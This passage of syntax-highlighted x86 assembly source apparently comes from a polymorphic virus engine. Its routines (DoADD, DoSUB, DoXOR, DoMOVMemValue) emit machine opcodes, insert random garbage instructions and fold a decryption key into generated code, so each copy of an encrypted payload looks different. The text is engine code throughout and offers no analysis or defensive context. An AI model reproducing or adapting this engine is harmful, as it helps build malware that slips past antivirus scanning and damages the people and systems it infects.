                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Others</span><span class="sc0">
      </span><span class="sc5">@@DEC01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
      </span><span class="sc5">@@CommonWithDEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Conserve EDI</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoADD</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Flag that we use when making comparisions, since LEA doesn't modify flags</span><span class="sc0">
</span><span class="sc5">FlagNoLEA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function makes a subtraction of the value in EAX to the register in</span><span class="sc0">
</span><span class="sc1">;; DL. Since this function is only called when we make comparisions, we have</span><span class="sc0">
</span><span class="sc1">;; to assure that LEA isn't used, so I put a flag to avoid LEAs. This function</span><span class="sc0">
</span><span class="sc1">;; then negates the value and calls to DoADD, but avoiding LEAs.</span><span class="sc0">
</span><span class="sc5">DoSUB</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; Negate value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FlagNoLEA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; Don't allow LEA</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">                        </span><span class="sc1">; Call to DoADD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FlagNoLEA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Allow LEA again</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoSUB</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function only makes a XOR Reg,Value. There isn't any work-around to</span><span class="sc0">
</span><span class="sc1">;; make XORs (well, you can use the fact that a XOR is</span><span class="sc0">
</span><span class="sc1">;; [(X AND Y) OR (NEG(X) AND NEG(Y)], which it's a bitch to code :).</span><span class="sc0">
</span><span class="sc5">DoXOR</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@DirectXOR</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectXOR</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

       </span><span class="sc5">@@DirectXOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; Do we use EAX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EAX</span><span class="sc0">      </span><span class="sc1">; Then use the EAX opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F081h</span><span class="sc0"> </span><span class="sc1">; Opcode of XOR Reg,Value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; Bind the register to the opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">              </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@J01</span><span class="sc0">        </span><span class="sc1">; Jump to continue</span><span class="sc0">
        </span><span class="sc5">@@EAX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">  </span><span class="sc1">; Opcode of XOR EAX,Value</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc5">@@J01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Get the value to XOR from stack</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">; Complete the instruction</span><span class="sc0">

       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Conserve EDI</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoXOR</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; EBX=Memory address, EAX=Value</span><span class="sc0">
</span><span class="sc5">DoMOVMemValue</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVDirect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@MOVDirect2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHPOP</span><span class="sc0">

        </span><span class="sc5">@@AdjustMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; ECX=Destiny (=EAX)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; EDX=Initial value</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">   </span><span class="sc1">; Move this to [EBX]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@Adj_Loop01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; ESI=Number that modifies</span><span class="sc0">
       </span><span class="sc5">@@Adj_Loop02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_Loop02</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Adj_ADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_XOR</span><span class="sc0">
     </span><span class="sc5">@@Adj_SUB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_SUB01</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_SUB01</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBMemReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_SUB01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">; Initial=Initial-Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBMemValue</span><span class="sc0">  </span><span class="sc1">; Do SUB [&lt;EBX&gt;],&lt;ESI&gt;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">

     </span><span class="sc5">@@Adj_ADD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_ADD01</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_ADD01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDMemReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_ADD01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">; Initial=Initial+Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDMemValue</span><span class="sc0">  </span><span class="sc1">; Do ADD [&lt;EBX&gt;],&lt;ESI&gt;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">

     </span><span class="sc5">@@Adj_XOR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_XOR01</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_XOR01</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORMemReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_XOR01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORMemValue</span><span class="sc0">

         </span><span class="sc5">@@Adj_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_Loop01</span><span class="sc0">

         </span><span class="sc5">@@Adj_Loop03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_Loop03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Adj_FinalADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_FinalSUB</span><span class="sc0">
       </span><span class="sc5">@@Adj_FinalXOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; EDX=Current value XOR final value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORMemValue</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@Adj_FinalADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDMemValue</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@Adj_FinalSUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBMemValue</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

     </span><span class="sc5">@@AdjustTimes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Padding</span><span class="sc0">

    </span><span class="sc5">@@PUSHPOP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

   </span><span class="sc5">@@MOVDirect</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05C7h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">         </span><span class="sc1">; First &lt;EBX&gt;</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

  </span><span class="sc5">@@MOVDirect2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MOVDirect</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00C7h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Byte</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
